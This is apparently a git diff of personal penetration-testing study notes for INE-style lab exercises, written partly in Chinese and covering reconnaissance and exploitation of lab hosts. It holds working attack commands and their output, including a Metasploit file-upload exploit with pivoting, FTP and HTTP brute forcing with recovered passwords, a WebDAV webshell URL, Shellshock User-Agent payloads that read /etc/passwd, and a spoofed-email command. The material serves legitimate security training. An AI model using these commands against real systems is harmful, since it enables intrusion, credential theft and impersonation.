@@ -1,4 +1,4 @@
-Windows Recon: Nmap Host Discovery
+## Windows Recon: Nmap Host Discovery
 	url:demo.ine.local
 	Find alive : ping -c 5 demo.ine.local
 	can scan :nmap demo.ine.local
@@ -6,13 +6,10 @@ Windows Recon: Nmap Host Discovery
 
 	nmap -Pn -sV demo.ine.local
 	-p 443 (https)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Scan the Server 1
-	nmap demo.ine.local -p- -sV
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Assessment Methodologies: Footprinting and Scanning CTF 1
-URL： http://target.ine.local.
-
+	
+ 	Scan the Server 1: 
+  	nmap demo.ine.local -p- -sV
+## Assessment Methodologies: Footprinting and Scanning CTF 1
 	nmap -Pn -sV -sC -p- target.ine.local
 
 	ftp 192.56.39.3 21  (anonymous)
@@ -20,9 +17,7 @@ URL： http://target.ine.local.
 	mysql -h 192.56.39.3 -P 3306 -u db_admin -p
 	SHOW DATABASES;
 
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Recon: SMB Nmap Scripts
+## Windows Recon: SMB Nmap Scripts
 
 		nmap -p445 --script smb-protocols demo.ine.local (Protocol)
 		nmap -p445 --script smb-security-mode demo.ine.local ( security level )
@@ -64,8 +59,7 @@ Windows Recon: SMB Nmap Scripts
 	列舉所有共用資料夾和驅動器，然後在所有共用資料夾上執行ls指令 (show all file)
 		nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Importing Nmap Scan Results Into MSF (have address)
+## Importing Nmap Scan Results Into MSF (have address)
 	=> 將 Nmap 掃描結果匯入 MSF
 		nmap -sV -Pn -oX myscan.xml demo.ine.local
 
@@ -76,79 +70,75 @@ Importing Nmap Scan Results Into MSF (have address)
 		msf6 > hosts
 		msf6 > services
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-T1046 : Network Service Scanning
+## T1046 : Network Service Scanning
+	Vulnerability: XODA File Upload Vulnerability
+	Metasploit module:
+	msfconsole > use  exploit/unix/webapp/xoda_file_upload
+		set RHOSTS demo1.ine.local
+		set TARGETURI /
+		set LHOST 192.41.123.2 
+		run
+	
+	shell => ip addr
+	eth1 介面上的 IP 位址是 192.143.222.2，第二個目標機器將位於第二個網路上的 192.143.222.3
+	
+	meterpreter > run autoroute -s 192.143.222.2
+	meterpreter > background
+	
+	TO create nmap :
+		use auxiliary/scanner/portscan/tcp
+		set RHOSTS  192.143.222.3
+		set verbose false
+		set ports 1-1000
+		exploit
+	
+	ls -al /root/static-binaries/nmap
+	file /root/static-binaries/nmap
+	
+	
+	nano bash-port-scanner.sh
+	#!/bin/bash
+	for port in {1..1000}; do
+	 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+	done
+	
+	
+	sessions -i 1
+	upload /root/static-binaries/nmap /tmp/nmap
+	upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+	
+	shell
+	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	cd /tmp/
+	chmod +x ./nmap ./bash-port-scanner.sh
+	./bash-port-scanner.sh 192.143.222.3
+	./nmap -p- 192.143.222.3
 
-Vulnerability: XODA File Upload Vulnerability
-Metasploit module:
-msfconsole > use  exploit/unix/webapp/xoda_file_upload
-	set RHOSTS demo1.ine.local
-	set TARGETURI /
-	set LHOST 192.41.123.2 
-	run
+## FTP Enumeration
 
-shell => ip addr
-eth1 介面上的 IP 位址是 192.143.222.2，第二個目標機器將位於第二個網路上的 192.143.222.3
+	msfconsole
+	識別目標上運行的 FTP 伺服器的服務版本 :
+		use auxiliary/scanner/ftp/ftp_version
+		set RHOSTS demo.ine.local
+		run
+	
+	暴力破解來識別可用於身份驗證的合法憑證：
+		use auxiliary/scanner/ftp/ftp_login
+		set RHOSTS demo.ine.local
+		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+		run
+	
+	檢查 FTP 伺服器是否允許匿名登錄：
+		use auxiliary/scanner/ftp/anonymous
+		set RHOSTS demo.ine.local
+		run
+	
+	ftp demo.ine.local
+	[+] 192.87.133.3:21       - 192.87.133.3:21 - Login Successful: sysadmin:654321
+	[+] 192.87.133.3:21       - 192.87.133.3:21 - Login Successful: rooty:qwerty
 
-meterpreter > run autoroute -s 192.143.222.2
-meterpreter > background
-
-TO create nmap :
-	use auxiliary/scanner/portscan/tcp
-	set RHOSTS  192.143.222.3
-	set verbose false
-	set ports 1-1000
-	exploit
-
-ls -al /root/static-binaries/nmap
-file /root/static-binaries/nmap
-
-
-nano bash-port-scanner.sh
-#!/bin/bash
-for port in {1..1000}; do
- timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
-done
-
-
-sessions -i 1
-upload /root/static-binaries/nmap /tmp/nmap
-upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
-
-shell
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-cd /tmp/
-chmod +x ./nmap ./bash-port-scanner.sh
-./bash-port-scanner.sh 192.143.222.3
-./nmap -p- 192.143.222.3
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-FTP Enumeration
-
-msfconsole
-識別目標上運行的 FTP 伺服器的服務版本 :
-	use auxiliary/scanner/ftp/ftp_version
-	set RHOSTS demo.ine.local
-	run
-
-暴力破解來識別可用於身份驗證的合法憑證：
-	use auxiliary/scanner/ftp/ftp_login
-	set RHOSTS demo.ine.local
-	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
-	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-	run
-
-檢查 FTP 伺服器是否允許匿名登錄：
-	use auxiliary/scanner/ftp/anonymous
-	set RHOSTS demo.ine.local
-	run
-
-ftp demo.ine.local
-[+] 192.87.133.3:21       - 192.87.133.3:21 - Login Successful: sysadmin:654321
-[+] 192.87.133.3:21       - 192.87.133.3:21 - Login Successful: rooty:qwerty
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Samba Recon: Basics
+## Samba Recon: Basics
 
 	Find the default tcp ports used by smbd:
 	=> nmap demo.ine.local
@@ -182,98 +172,95 @@ Samba Recon: Basics
 	=> rpcclient -U "" -N demo.ine.loca
 		rpcclient $> l
 	允許匿名連接 : 在沒有任何憑證的情況下連接到 samba 伺服器時不會引發錯誤
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Apache Enumeration
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-ping -c 5 victim-1
+## Apache Enumeration
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	ping -c 5 victim-1
+	
+	msfconsole -q
+	version : 
+		use auxiliary/scanner/http/http_version
+		set RHOSTS victim-1
+		run
+		[+] 192.197.47.3:80 Apache/2.4.18 (Ubuntu)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~
+	show /robots.txt : 
+		use auxiliary/scanner/http/robots_txt
+		set RHOSTS victim-1
+		run
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+		use auxiliary/scanner/http/http_header
+		set RHOSTS victim-1
+		run
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+		use auxiliary/scanner/http/http_header
+		set RHOSTS victim-1
+		set TARGETURI /secure
+		run
+		[+] 192.197.47.3:80      : WWW-AUTHENTICATE: Basic realm="Restricted Content"
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Need time to wait !!!!!!!!!!!!!!!!!!! (5 min)
+		use auxiliary/scanner/http/brute_dirs
+		set RHOSTS victim-1
+		run
+		[+] Found http://victim-1:80/doc/ 200
+		[+] Found http://victim-1:80/pro/ 200
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Fast 
+		use auxiliary/scanner/http/dir_scanner
+		set RHOSTS victim-1
+		set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
+		run
+		[+] Found http://victim-1:80//data/ 200 (192.197.47.3)
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+		use auxiliary/scanner/http/dir_listing
+		set RHOSTS victim-1
+		set PATH /data
+		run
+		[+] Found Directory Listing http://victim-1:80/data/
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+		Need wait (found php , bak ,etc)
+		use auxiliary/scanner/http/files_dir
+		set RHOSTS victim-1
+		set VERBOSE false
+		run
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+	上寫入了一個檔案 : 如果該檔案已經存在，它將覆蓋它
+		use auxiliary/scanner/http/http_put
+		set RHOSTS victim-1
+		set PATH /data
+		set FILENAME test.txt
+		set FILEDATA "Welcome To AttackDefense"
+		run
+		[+] File uploaded: http://192.197.47.3:80/data/test.txt
+	
+		wget http://victim-1:80/data/test.txt 
+		cat test.txt
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+	使用 DELETE 方法並刪除 text.file
+		use auxiliary/scanner/http/http_put
+		set RHOSTS victim-1
+		set PATH /data
+		set FILENAME test.txt
+		set ACTION DELETE
+		run
+		[+] File deleted: http://192.197.47.3:80/data/test.txt
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+	LOGIN : 
+		use auxiliary/scanner/http/http_login
+		set RHOSTS victim-1
+		set AUTH_URI /secure/
+		set VERBOSE false
+		run
+		[+] 192.197.47.3:80 - Success: 'bob:123321'    
+		~~~~~~~~~~~~~~~~~~~~~~~~~~
+		use auxiliary/scanner/http/apache_userdir_enum
+		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+		set RHOSTS victim-1
+		set VERBOSE false
+		run
+		[+] http://192.197.47.3/ - Users found: alice, backup, bin, bob, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, proxy, sync, sys, uucp
 
-msfconsole -q
-version : 
-	use auxiliary/scanner/http/http_version
-	set RHOSTS victim-1
-	run
-	[+] 192.197.47.3:80 Apache/2.4.18 (Ubuntu)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-show /robots.txt : 
-	use auxiliary/scanner/http/robots_txt
-	set RHOSTS victim-1
-	run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-	use auxiliary/scanner/http/http_header
-	set RHOSTS victim-1
-	run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-	use auxiliary/scanner/http/http_header
-	set RHOSTS victim-1
-	set TARGETURI /secure
-	run
-	[+] 192.197.47.3:80      : WWW-AUTHENTICATE: Basic realm="Restricted Content"
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-Need time to wait !!!!!!!!!!!!!!!!!!! (5 min)
-	use auxiliary/scanner/http/brute_dirs
-	set RHOSTS victim-1
-	run
-	[+] Found http://victim-1:80/doc/ 200
-	[+] Found http://victim-1:80/pro/ 200
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-Fast 
-	use auxiliary/scanner/http/dir_scanner
-	set RHOSTS victim-1
-	set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
-	run
-	[+] Found http://victim-1:80//data/ 200 (192.197.47.3)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-	use auxiliary/scanner/http/dir_listing
-	set RHOSTS victim-1
-	set PATH /data
-	run
-	[+] Found Directory Listing http://victim-1:80/data/
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-	Need wait (found php , bak ,etc)
-	use auxiliary/scanner/http/files_dir
-	set RHOSTS victim-1
-	set VERBOSE false
-	run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-上寫入了一個檔案
-如果該檔案已經存在，它將覆蓋它
-	use auxiliary/scanner/http/http_put
-	set RHOSTS victim-1
-	set PATH /data
-	set FILENAME test.txt
-	set FILEDATA "Welcome To AttackDefense"
-	run
-	[+] File uploaded: http://192.197.47.3:80/data/test.txt
-
-	wget http://victim-1:80/data/test.txt 
-	cat test.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-使用 DELETE 方法並刪除 text.file
-	use auxiliary/scanner/http/http_put
-	set RHOSTS victim-1
-	set PATH /data
-	set FILENAME test.txt
-	set ACTION DELETE
-	run
-	[+] File deleted: http://192.197.47.3:80/data/test.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-LOGIN : 
-	use auxiliary/scanner/http/http_login
-	set RHOSTS victim-1
-	set AUTH_URI /secure/
-	set VERBOSE false
-	run
-	[+] 192.197.47.3:80 - Success: 'bob:123321'    
-	~~~~~~~~~~~~~~~~~~~~~~~~~~
-	use auxiliary/scanner/http/apache_userdir_enum
-	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
-	set RHOSTS victim-1
-	set VERBOSE false
-	run
-	[+] http://192.197.47.3/ - Users found: alice, backup, bin, bob, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, proxy, sync, sys, uucp
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-MySQL Enumeration
+## MySQL Enumeration
 	ping -c 4 demo.ine.local
 	nmap demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -364,10 +351,7 @@ MySQL Enumeration
 	[+] 192.211.100.3:3306 - /tmp is writeable
 	[+] 192.211.100.3:3306 - /root is writeable
 
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-SSH Login
+## SSH Login
 
 	nmap -sS -sV demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -485,8 +469,8 @@ SSH Login
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Send a fake mail to root user using sendemail command.
 	=> sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Assessment Methodologies: Enumeration CTF 1
+
+## Assessment Methodologies: Enumeration CTF 1
 
 
 	提供有關可用共享及其存取權限的資訊 :
@@ -557,8 +541,7 @@ Assessment Methodologies: Enumeration CTF 1
 	get
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ssh target.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows: IIS Server DAVTest
+## Windows: IIS Server DAVTest
 	Davtest 是一個 WebDAV 掃描器 將漏洞利用檔案傳送到 WebDAV 伺服器並自動建立目錄
 	Cadaver 是一個用於 WebDAV 用戶端的工具，它支援命令列風格的介面。支援文件上傳、編輯、移動等操作
 	| Username | Password | | bob | password_123321 |
@@ -590,8 +573,7 @@ Windows: IIS Server DAVTest
 	http://demo.ine.local/webdav/webshel​​l.asp?cmd=type+C%3A%5Cflag.txt
 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Shellshock
+## Shellshock
 	=> OWASP A9 Using Components with Known Vulnerabilities
 	=> CVE-2014-6071
 
@@ -606,8 +588,7 @@ Shellshock
 	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
 	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'id'
 	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'ps -ef'
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Web App Vulnerability Scanning With WMAP
+## Web App Vulnerability Scanning With WMAP
 識別 Web 伺服器上的錯誤配置和可利用的漏洞
 
 	識別目標IP位址 => ifconfig (192.234.27.2)
@@ -619,8 +600,7 @@ Web App Vulnerability Scanning With WMAP
 	開始執行 Web 應用程式漏洞掃描=>確定哪些模組可以針對目標 Web 伺服器運行 wmap_run -t
 	將針對目標 Web 伺服器執行所有啟用的模組，並顯示模組的結果 wmap_run -e
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Assessment Methodologies: Vulnerability Assessment CTF 1
+## Assessment Methodologies: Vulnerability Assessment CTF 1
 	nmap -sC -sV target.ine.local --script vuln --min-rate 1000
 	nmap --script http-enum -sV -p 80 target.ine.local
 
